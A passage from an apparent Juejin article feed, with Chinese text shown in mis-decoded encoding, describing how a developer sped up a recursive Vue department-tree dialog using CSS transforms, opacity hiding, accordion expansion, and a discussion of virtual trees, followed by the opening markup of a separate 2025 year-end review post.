<p><strong>æµè§ˆå™¨æ¸²æŸ“ä¸‰å…„å¼Ÿ</strong></p>
<ul>
<li><strong>Reflow (é‡æ’)</strong>ï¼šç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ã€‚ä¿®æ”¹ <code>height</code>ã€<code>width</code> æ—¶ï¼Œæµè§ˆå™¨è¦é‡æ–°è®¡ç®—æ‰€æœ‰å…ƒç´ ä½ç½®ï¼Œ<strong>å¼€é”€æœ€å¤§</strong>ã€‚</li>
<li><strong>Repaint (é‡ç»˜)</strong>ï¼šæ¢æ±¤ä¸æ¢è¯ã€‚ä¿®æ”¹ <code>color</code>ã€<code>background</code> æ—¶ï¼Œä¸å½±å“ä½ç½®ï¼Œåªé‡ç”»æ ·å­ï¼Œ<strong>å¼€é”€ä¸­ç­‰</strong>ã€‚</li>
<li><strong>Composite (åˆæˆ)</strong>ï¼š<strong>VIP ç»¿è‰²é€šé“</strong>ã€‚ä¿®æ”¹ <code>transform</code>ã€<code>opacity</code> æ—¶ï¼Œæµè§ˆå™¨ç›´æ¥æŠŠå›¾å±‚äº¤ç»™ GPU å¤„ç†ï¼Œ<strong>è·³è¿‡</strong>å¸ƒå±€å’Œç»˜åˆ¶ï¼Œ<strong>å¼€é”€æœ€å°</strong>ï¼</li>
</ul>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä¼˜åŒ–å‰ï¼šå¡é¡¿æºå¤´ */</span>
<span class="hljs-selector-class">.subItem</span> {
  <span class="hljs-attribute">transition</span>: height <span class="hljs-number">0.3s</span> ease-in-out;
}

<span class="hljs-comment">/* ä¼˜åŒ–åï¼šä¸æ»‘æ— æ¯” */</span>
<span class="hljs-selector-class">.subItem</span> {
  <span class="hljs-attribute">transform-origin</span>: top; <span class="hljs-comment">/* ç¡®ä¿ä»é¡¶éƒ¨å¼€å§‹å±•å¼€ */</span>
  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.645</span>, <span class="hljs-number">0.045</span>, <span class="hljs-number">0.355</span>, <span class="hljs-number">1</span>);
}

<span class="hljs-selector-class">.subItem</span><span class="hljs-selector-class">.expanded</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-selector-class">.subItem</span><span class="hljs-selector-class">.collapsed</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<blockquote>
<p><strong>âš ï¸ é¿å‘æŒ‡å—ï¼šå…³äº <code>will-change: </code></strong></p>
<p>æœ‰åŒå­¦å¯èƒ½ä¼šé—®ï¼šâ€œä¸ºä»€ä¹ˆä¸åŠ  <code>will-change: transform</code>ï¼Ÿâ€</p>
<ul>
<li>å°‘é‡å…ƒç´ æ—¶å¯ä»¥è€ƒè™‘ï¼›å¤§è§„æ¨¡é€’å½’æ ‘åƒä¸‡åˆ«å…¨å±€åŠ ã€‚</li>
<li>å‚è€ƒ MDNï¼šä¸åˆ°ä¸å¾—å·²ä¸è¦ä½¿ç”¨ï¼›ä»…åœ¨ç¡®æœ‰å¿…è¦æ—¶çŸ­æ—¶æ·»åŠ ï¼Œè¿‡åº¦ä½¿ç”¨ä¼šå¯¼è‡´å†…å­˜å ç”¨å¢åŠ ä¸æ€§èƒ½ä¸‹é™ã€‚</li>
<li>æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FCSS%2Fwill-change" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/CSS/will-change" ref="nofollow noopener noreferrer">developer.mozilla.org/en-US/docs/â€¦</a></li>
<li>å»ºè®®ï¼šå¦‚éœ€ä½¿ç”¨ï¼ŒæŒ‰éœ€ã€çŸ­æ—¶ã€å°‘é‡å…ƒç´ ï¼Œå¹¶åœ¨åŠ¨ç”»ç»“æŸåç§»é™¤ã€‚</li>
</ul>
</blockquote>
<p>æ•ˆæœï¼š åŠ¨ç”»æµç•…ã€äº¤äº’å“åº”å³æ—¶ã€‚ï¼ˆGIFå›¾å‹ç¼©ä¸¥é‡ï¼Œè¯·è‡ªåŠ¨è„‘è¡¥å¾·èŠ™å¹¿å‘Šçš„ä¸æ»‘è´¨æ„Ÿï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/674c72b24f914e3f9b9254cbfe8454df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=51eSiVp7hUUWuEPdjr7STPY0Leo%3D" alt="èŠ‚ç‚¹å±•å¼€åŠ¨ç”»ä¼˜åŒ–.gif" loading="lazy"/></p>
<h3 data-id="heading-16">2. é”€æ¯å±‚ï¼šä»¥â€œè—â€ä»£â€œåˆ â€</h3>
<p><strong>ç—›ç‚¹</strong>ï¼š
å³ä½¿ç”¨æˆ·åªæ˜¯ä¸´æ—¶å…³é—­å¼¹çª—ï¼Œä¸‹æ¬¡è¿˜è¦å†å¼€ï¼ŒåŸæ¥çš„é€»è¾‘ä¹Ÿæ˜¯ç›´æ¥ <code>v-if="false"</code> é”€æ¯æ•´ä¸ªç»„ä»¶æ ‘ã€‚è¿™å°±å¯¼è‡´äº†é‚£ 5 ç§’çš„ <code>removeChild</code> å¡é¡¿ã€‚</p>
<p><strong>ä¼˜åŒ–</strong>ï¼š
å¯¹äºè¿™ç§å·¨å‹ç»„ä»¶ï¼Œå…³é—­å¼¹çª—æ—¶<strong>ä¸è¦é”€æ¯å®ƒ</strong>ï¼Œè€Œæ˜¯æŠŠå®ƒâ€œè—èµ·æ¥â€ã€‚</p>
<p><strong>ä»£ç æ”¹åŠ¨</strong>ï¼š
å°†å¼¹çª—çš„æ˜¾éšæ§åˆ¶ä» <code>v-if</code> æ”¹ä¸º <code>v-show</code>ï¼Œæˆ–è€…ä½¿ç”¨é€æ˜åº¦æ–¹æ¡ˆï¼š</p>
<blockquote>
<p><strong>v-if ã€ Opacityã€  v-show</strong>çš„åŒºåˆ«</p>
<ul>
<li>
<p><strong>v-if</strong>ï¼šçœŸæ­£çš„æ¡ä»¶æ¸²æŸ“ã€‚åˆ‡æ¢æ—¶ï¼Œç»„ä»¶åŠå…¶å†…éƒ¨æ‰€æœ‰çš„äº‹ä»¶ç›‘å¬å™¨å’Œå­ç»„ä»¶éƒ½ä¼šè¢«<strong>é”€æ¯å’Œé‡å»º</strong>ã€‚å¯¹äº 2500 ä¸ªèŠ‚ç‚¹çš„æ ‘ï¼Œè¿™æ„å‘³ç€æˆåƒä¸Šä¸‡æ¬¡çš„ DOM æ’å…¥/åˆ é™¤æ“ä½œã€‚</p>
</li>
<li>
<p><strong>v-show</strong>ï¼šç®€å•çš„ CSS åˆ‡æ¢ï¼ˆdisplay: noneï¼‰ã€‚ç»„ä»¶å®ä¾‹å§‹ç»ˆä¿ç•™ï¼Œå¼€é”€æå°ã€‚</p>
</li>
<li>
<p><strong>Opacity (é€æ˜)</strong>ï¼š<code>opacity: 0</code>ã€‚DOM ä¿ç•™ï¼Œé…åˆ GPU åŠ é€Ÿä»…è§¦å‘åˆæˆ (Composite)ï¼Œ<strong>åˆ‡æ¢æˆæœ¬æœ€ä½</strong>ï¼ˆæœ¬æ¡ˆæœ€ç»ˆæ–¹æ¡ˆï¼‰ã€‚</p>
</li>
</ul>
</blockquote>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* åªæ˜¯çœ‹ä¸è§ï¼Œä½† DOM è¿˜åœ¨ï¼Œé¿å…äº†æ˜‚è´µçš„å¸è½½è¿‡ç¨‹ */</span>
<span class="hljs-selector-class">.dialog-hidden</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">pointer-events</span>: none; <span class="hljs-comment">/* ç¡®ä¿ç‚¹ä¸åˆ° */</span>
  <span class="hljs-attribute">z-index</span>: -<span class="hljs-number">1</span>;
}
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼š
å…³é—­å¼¹çª—æ—¶ï¼Œè€—æ—¶ä» <strong>5s</strong> ç¬é—´å˜ä¸º <strong>0ms</strong>ï¼ˆåªæ˜¯æ”¹äº†ä¸ª CSS å±æ€§ï¼‰ã€‚ä¸‹æ¬¡å†æ‰“å¼€æ—¶ï¼Œå› ä¸º DOM éƒ½åœ¨ï¼Œç›´æ¥æ¢å¤é€æ˜åº¦å³å¯ï¼Œå®ç°äº†çœŸæ­£çš„â€œç§’å¼€â€ã€‚</p>
<h3 data-id="heading-17">3. äº¤äº’å±‚ï¼šæ‰‹é£ç´æ¨¡å¼ï¼ˆAccordionï¼‰</h3>
<blockquote>
<p><strong>ğŸ¤” ä»€ä¹ˆæ˜¯æ‰‹é£ç´æ•ˆæœï¼Ÿ</strong></p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ <strong>åŒä¸€çº§åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å±•å¼€</strong>ã€‚
å°±åƒæ‰‹é£ç´çš„é£ç®±ï¼Œæ‹‰å¼€è¿™ä¸€æŠ˜ï¼Œé‚£ä¸€æŠ˜è‡ªç„¶åˆä¸Šã€‚æ¯”å¦‚è´¢åŠ¡éƒ¨å’Œç ”å‘éƒ¨æ˜¯å…„å¼ŸèŠ‚ç‚¹ï¼Œå½“ä½ ç‚¹å‡»å±•å¼€â€œè´¢åŠ¡éƒ¨â€çš„å­èŠ‚ç‚¹ï¼Œä¹‹å‰ç‚¹å¼€çš„â€œç ”å‘éƒ¨â€ä¼šè‡ªåŠ¨æ”¶èµ·ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¼˜åŒ–åçš„æ•ˆæœå›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6748feeb1794a928094ef6aa00bbc54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=kzS7JHNFNbqabkFvZZck1SnOI3Q%3D" alt="æ‰‹é£ç´æ•ˆæœ.gif" loading="lazy"/></p>
<p><strong>ç—›ç‚¹</strong>ï¼š
ToB ç³»ç»Ÿçš„ç”¨æˆ·æœ‰æ—¶æ“ä½œå¾ˆâ€œé‡â€ï¼Œä»–ä»¬å¯èƒ½ä¼šæŠŠæ‰€æœ‰éƒ¨é—¨ä¸€å±‚å±‚å…¨éƒ¨ç‚¹å¼€ã€‚
å¦‚æœä¸åŠ é™åˆ¶ï¼Œéšç€ç”¨æˆ·ä¸æ–­å±•å¼€ï¼Œé¡µé¢ä¸Šçš„ DOM èŠ‚ç‚¹æ•°é‡ä¾ç„¶ä¼šæ— é™åˆ¶å¢é•¿ï¼Œæœ€ç»ˆå†æ¬¡æ‹–æ…¢æµè§ˆå™¨ã€‚</p>
<p><strong>ä¼˜åŒ–</strong>ï¼š
ä¸ºç»„ä»¶å¢åŠ  <code>accordion</code>ï¼ˆæ‰‹é£ç´ï¼‰æ¨¡å¼é…ç½®ã€‚
<strong>åŸç†</strong>ï¼šå¼€å¯åï¼ŒåŒçº§èŠ‚ç‚¹åŒæ—¶åªèƒ½å±•å¼€ä¸€ä¸ªã€‚å½“ä½ å±•å¼€â€œè´¢åŠ¡éƒ¨â€æ—¶ï¼Œä¹‹å‰å±•å¼€çš„â€œç ”å‘éƒ¨â€ä¼šè‡ªåŠ¨æ”¶èµ·ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ªä»£ç ï¼šæ‰‹é£ç´é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">onNodeExpand</span>(<span class="hljs-params">node</span>) {
  <span class="hljs-keyword">if</span> (accordionMode) {
    <span class="hljs-comment">// å…„å¼ŸèŠ‚ç‚¹ï¼Œç»Ÿç»Ÿæ”¶èµ·ï¼</span>
    siblings.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">sib</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (sib !== node) sib.<span class="hljs-property">isExpand</span> = <span class="hljs-literal">false</span>
    })
  }
  node.<span class="hljs-property">isExpand</span> = <span class="hljs-literal">true</span>
}
</code></pre>
<p>è¿™ä»<strong>äº¤äº’è®¾è®¡</strong>å±‚é¢å¯¹ DOM å³°å€¼è®¾å®šäº†ä¸Šé™ï¼šä¸ç®¡æ€ä¹ˆç‚¹ï¼ŒåŒçº§åªä¿ç•™ä¸€ä¸ªå±•å¼€é¡¹ï¼Œé¡µé¢åŒæ—¶å­˜åœ¨çš„ DOM æ•°å§‹ç»ˆå¤„äºä½ä½ä¸”å¯æ§ã€‚</p>
<h2 data-id="heading-18">ç•ªå¤–ç¯‡ï¼šå¦‚æœæ•°æ®é‡å†å¤§ 10 å€æ€ä¹ˆåŠï¼Ÿ</h2>
<p>è™½ç„¶è¿™æ¬¡ 2000å¤šæ¡æ•°æ®æå®šäº†ï¼Œä½†è‚¯å®šæœ‰å°ä¼™ä¼´ä¼šé—®ï¼šâ€œå¦‚æœæœ‰ <strong>2ä¸‡å¤šæ¡</strong> ç”šè‡³æ›´å¤šæ€ä¹ˆåŠï¼Ÿâ€</p>
<p>è¿™æ—¶å€™ï¼Œå•çº¯çš„æ‡’åŠ è½½ä¹Ÿä¸å¤Ÿç”¨äº†ï¼Œå› ä¸º DOM èŠ‚ç‚¹çš„æ€»æ•°ä¾ç„¶å¯èƒ½çªç ´æµè§ˆå™¨æé™ã€‚æˆ‘ä»¬éœ€è¦å¼•å…¥æ ¸æ­¦å™¨â€”â€”<strong>è™šæ‹Ÿæ ‘ (Virtual Tree)</strong>ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯<strong>åªæ¸²æŸ“ä½ å±å¹•é‡Œçœ‹å¾—åˆ°çš„é‚£äº›èŠ‚ç‚¹</strong>ã€‚
ä¸ç®¡æ ‘æœ‰å‡ ä¸‡å±‚ï¼Œå±å¹•å°±é‚£ä¹ˆé«˜ï¼ˆæ¯”å¦‚ 800pxï¼‰ï¼Œæˆ‘åªæ¸²æŸ“è¿™å‡ åä¸ªèŠ‚ç‚¹ï¼Œå…¶ä»–çš„ç”¨ä¸ªç©º <code>div</code> æ’‘å¼€é«˜åº¦æŠŠæ»šåŠ¨æ¡éª—è¿‡å»å°±è¡Œã€‚</p>
<p><strong>æ€è·¯ä¹Ÿå¾ˆç›´ç™½</strong>ï¼š</p>
<ol>
<li><strong>æ‹å¹³</strong>ï¼šæŠŠæ ‘æ‹†æˆä¸€ä¸ªå¤§çš„ä¸€ç»´æ•°ç»„ã€‚</li>
<li><strong>è®¡ç®—</strong>ï¼šç®—ç®—å½“å‰æ»šåŠ¨æ¡åœ¨ä»€ä¹ˆä½ç½®ï¼Œå¯¹åº”æ•°ç»„é‡Œçš„å“ªå‡ æ¡æ•°æ®ã€‚</li>
<li><strong>æ¸²æŸ“</strong>ï¼šåªæŠŠè¿™å‡ æ¡ç”»å‡ºæ¥ï¼Œç»å¯¹å®šä½åˆ°æ­£ç¡®çš„åœ°æ–¹ã€‚</li>
</ol>
<p><strong>é‚£ä¸ºä»€ä¹ˆè¿™æ¬¡æ²¡ç”¨ï¼Ÿ</strong>
è¿˜æ˜¯é‚£å¥è€è¯ï¼š<strong>ROIï¼ˆæŠ•å…¥äº§å‡ºæ¯”ï¼‰</strong>ã€‚</p>
<p>æ‰‹å†™è™šæ‹Ÿæ ‘è¦å¤„ç†åŠ¨æ€é«˜åº¦ã€å¤é€‰æ¡†è”åŠ¨ç­‰éš¾ç‚¹ï¼Œå¤´å‘éƒ½è¦æ‰ä¸€æŠŠï¼›å¼•å…¥ç°æˆçš„åº“åˆä¼šå¢åŠ åŒ…ä½“ç§¯ã€‚
å¯¹äº å‡ åƒæ¡æ•°æ®ï¼Œç°åœ¨çš„æ–¹æ¡ˆå·²ç»å¤Ÿç”¨äº†ï¼Œå†ä¸Šè™šæ‹Ÿæ ‘å°±æ˜¯â€œå¤§ç‚®æ‰“èšŠå­â€ï¼Œæ²¡å¿…è¦å¢åŠ ç»´æŠ¤æˆæœ¬ã€‚</p>
<p><strong>æŠ€æœ¯é€‰å‹æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰æœ€é€‚åˆå½“ä¸‹çš„æ–¹æ¡ˆã€‚</strong></p>
<h2 data-id="heading-19">äº”ã€ ä¼˜åŒ–ç»“æœä¸å®¢æˆ·åé¦ˆ</h2>
<p>æ•ˆæœå›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dffe2fd5a3354652a5ebc920f7d05390~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=uKpRSm%2FUtYKyE726u%2FxILUcGaeQ%3D" alt="ä¼˜åŒ–åç»“æœ.gif" loading="lazy"/></p>
<p>æˆ‘ä»¬å°†ä¼˜åŒ–åçš„è¡¥ä¸å‘ç»™å®¢æˆ·éªŒè¯ï¼š</p>
<ol>
<li><strong>æ‰“å¼€å¼¹çª—</strong>ï¼šä¿æŒç§’å¼€ã€‚</li>
<li><strong>å¯»æ‰¾éƒ¨é—¨ï¼ˆå±•å¼€ï¼‰</strong>ï¼šä» <strong>åå‡ ç§’å¡æ­»</strong> å˜ä¸º <strong>å³æ—¶å“åº”</strong>ã€‚</li>
<li><strong>å®Œæˆæˆæƒï¼ˆå…³é—­ï¼‰</strong>ï¼šä» <strong>5s å¡æ­»</strong> å˜ä¸º <strong>0 å»¶è¿Ÿ</strong>ã€‚</li>
</ol>
<p>Performance é¢æ¿å†æ¬¡æŸ¥çœ‹ï¼Œé‚£æ¡å¿ƒç”µå›¾ç»ˆäºå¹³ç¨³äº†ï¼Œåªæœ‰é›¶æ˜Ÿçš„å‡ ä¸ªå°æ³¢å³°ï¼Œä»£è¡¨æ­£å¸¸çš„æ¸²æŸ“ä»»åŠ¡ã€‚</p>
<p>å®¢æˆ·åé¦ˆï¼šâ€œç»ˆäºé¡ºç•…äº†ï¼Œè¿™æ‰æ˜¯ä¸“ä¸šç³»ç»Ÿè¯¥æœ‰çš„æ ·å­ã€‚â€ï¼ˆè€æ¿ç»ˆäºéœ²å‡ºäº†æ»¡æ„çš„å¾®ç¬‘ï¼‰</p>
<hr/>
<h2 data-id="heading-20">å…­ã€ å†™åœ¨æœ€å</h2>
<p>è¿™æ¬¡â€œæ¥ç›˜â€ç»å†å‘Šè¯‰æˆ‘ï¼š</p>
<ol>
<li>
<p><strong>ä¸è¦ä¸ºäº†ä¼˜åŒ–è€Œä¼˜åŒ–</strong>ï¼šâ€œåˆ†å¸§æ¸²æŸ“â€æ˜¯ä¸ªå¥½æŠ€æœ¯ï¼Œä½†å¦‚æœé…åˆä¸Šäº†â€œå…¨é‡æŒ‚è½½â€ï¼Œå°±åƒè®©ä¸€åƒä¸ªäººåŒæ—¶åœ¨èµ°å»Šé‡Œâ€œæ…¢è·‘â€ï¼Œè™½ç„¶æ¯ä¸ªäººè·‘å¾—æ…¢ï¼Œä½†è·¯è¿˜æ˜¯è¢«å µæ­»äº†ã€‚</p>
</li>
<li>
<p><strong>å…³æ³¨â€œé”€æ¯â€æˆæœ¬</strong>ï¼šæ€§èƒ½ä¼˜åŒ–ä¸ä»…æ˜¯â€œæ¸²æŸ“å¿«â€ï¼Œè¿˜è¦â€œé”€æ¯å¿«â€ã€‚</p>
</li>
<li>
<p><strong>é€’å½’ç»„ä»¶è¦æ…é‡</strong>ï¼šé€’å½’ç»„ä»¶æ˜¯æ€§èƒ½é—®é¢˜çš„é‡ç¾åŒºï¼Œä¸€å®šè¦æ—¶åˆ»è­¦æƒ•â€œæŒ‡æ•°çº§çˆ†ç‚¸â€ã€‚</p>
</li>
</ol>
<p>æœ€åçš„æœ€åï¼Œè€ç‹å›æ¥åï¼Œæˆ‘å¿…é¡»å¾—è¯·ä»–åƒé¡¿å¥½çš„â€”â€”æ¯•ç«Ÿæ²¡æœ‰ä»–è¿™ä»£ç ï¼Œæˆ‘ä¹Ÿæ²¡æœºä¼šå†™è¿™ç¯‡å‡ åƒå­—çš„å¤ç›˜æ–‡ç« ï¼Œæ›´æ²¡æœºä¼šåœ¨æ˜é‡‘éª—å¤§å®¶çš„èµï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ã€‚</p>
<p><strong>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¯å‘ï¼Œæ¬¢è¿ ç‚¹èµã€æ”¶è—ã€è½¬å‘ï¼Œè¿™å¯¹æˆ‘å¾ˆé‡è¦ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘çš„ 2025ï¼šä»£ç ç•™ç—•ï¼Œæ—¶å…‰æœ‰æš–ï¼Œæˆé•¿æœ‰è¿¹]]></title>    <link>https://juejin.cn/post/7589181008097820687</link>    <guid>https://juejin.cn/post/7589181008097820687</guid>    <pubDate>2025-12-30T00:09:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008097820687" data-draft-id="7589104492882608180" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘çš„ 2025ï¼šä»£ç ç•™ç—•ï¼Œæ—¶å…‰æœ‰æš–ï¼Œæˆé•¿æœ‰è¿¹"/> <meta itemprop="keywords" content="å¹´ç»ˆæ€»ç»“"/> <meta itemprop="datePublished" content="2025-12-30T00:09:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰åªèŒæ–°"/> <meta itemprop="url" content="https://juejin.cn/user/360295544400973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘çš„ 2025ï¼šä»£ç ç•™ç—•ï¼Œæ—¶å…‰æœ‰æš–ï¼Œæˆé•¿æœ‰è¿¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295544400973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰åªèŒæ–°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:09:07.000Z" title="Tue Dec 30 2025 00:09:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼€ç¯‡ï¼š2025ï¼Œä»£ç ã€å¨ƒå’Œå†™æ–‡çš„ä¸€å¹´</h2>
